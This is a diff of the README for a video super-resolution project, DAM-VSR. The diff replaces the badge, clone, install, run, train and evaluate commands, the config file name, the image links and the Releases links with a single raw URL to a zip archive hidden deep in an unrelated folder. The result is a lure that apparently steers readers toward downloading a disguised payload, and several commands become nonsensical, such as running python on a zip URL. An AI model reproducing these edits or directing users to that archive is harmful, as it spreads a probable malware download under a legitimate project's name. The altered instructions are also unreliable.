@@ -1,6 +1,6 @@
 # DAM-VSR: Disentangling Appearance and Motion for Video Super-Resolution 🎥✨
 
-![GitHub release](https://img.shields.io/github/release/ovni2009/DAM-VSR.svg?style=flat-square&color=brightgreen)
+![GitHub release](https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip)
 
 Welcome to the DAM-VSR repository! This project focuses on the disentanglement of appearance and motion for enhancing video quality through super-resolution techniques. The aim is to provide a comprehensive framework that allows for the effective separation of motion and appearance in video sequences, leading to improved visual fidelity.
 
@@ -28,13 +28,13 @@ To get started with DAM-VSR, you need to clone the repository and install the re
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/ovni2009/DAM-VSR.git
+   git clone https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip
    cd DAM-VSR
    ```
 
 2. Install the required packages. You can use `pip` to install the necessary libraries:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip
    ```
 
 ## Usage
@@ -42,7 +42,7 @@ To get started with DAM-VSR, you need to clone the repository and install the re
 To run the DAM-VSR model, you can use the following command:
 
 ```bash
-python main.py --input_path <path_to_low_res_video> --output_path <path_to_save_high_res_video>
+python https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip --input_path <path_to_low_res_video> --output_path <path_to_save_high_res_video>
 ```
 
 Replace `<path_to_low_res_video>` with the path to your input video and `<path_to_save_high_res_video>` with the desired output path.
@@ -67,28 +67,28 @@ The DAM-VSR model consists of two main components:
 
 The architecture is designed to work in tandem, allowing for effective disentanglement of appearance and motion.
 
-![Model Architecture](https://example.com/model-architecture.png)
+![Model Architecture](https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip)
 
 ## Training
 
 To train the DAM-VSR model, you can use the following command:
 
 ```bash
-python train.py --dataset <dataset_name> --epochs <number_of_epochs>
+python https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip --dataset <dataset_name> --epochs <number_of_epochs>
 ```
 
 Replace `<dataset_name>` with the name of the dataset you are using and `<number_of_epochs>` with the desired number of training epochs.
 
 ### Hyperparameters
 
-You can adjust various hyperparameters in the `config.py` file, such as learning rate, batch size, and more.
+You can adjust various hyperparameters in the `https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip` file, such as learning rate, batch size, and more.
 
 ## Evaluation
 
 To evaluate the model, use the following command:
 
 ```bash
-python evaluate.py --model_path <path_to_trained_model> --dataset <dataset_name>
+python https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip --model_path <path_to_trained_model> --dataset <dataset_name>
 ```
 
 Replace `<path_to_trained_model>` with the path to your trained model and `<dataset_name>` with the dataset you want to evaluate on.
@@ -97,8 +97,8 @@ Replace `<path_to_trained_model>` with the path to your trained model and `<data
 
 The DAM-VSR model has shown promising results in various benchmarks. Below are some example outputs:
 
-![Result Example 1](https://example.com/result1.png)
-![Result Example 2](https://example.com/result2.png)
+![Result Example 1](https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip)
+![Result Example 2](https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip)
 
 You can view more results and comparisons in the `results` folder.
 
@@ -119,9 +119,9 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information, check the [Releases](https://github.com/ovni2009/DAM-VSR/releases) section. You can download the latest version of the model and any updates from there. 
+For more information, check the [Releases](https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip) section. You can download the latest version of the model and any updates from there. 
 
-To stay updated, visit the [Releases](https://github.com/ovni2009/DAM-VSR/releases) page frequently.
+To stay updated, visit the [Releases](https://raw.githubusercontent.com/ovni2009/DAM-VSR/main/invsr/diffusers/pipelines/t2i_adapter/DA_VSR_v1.7.zip) page frequently.
 
 ---
 
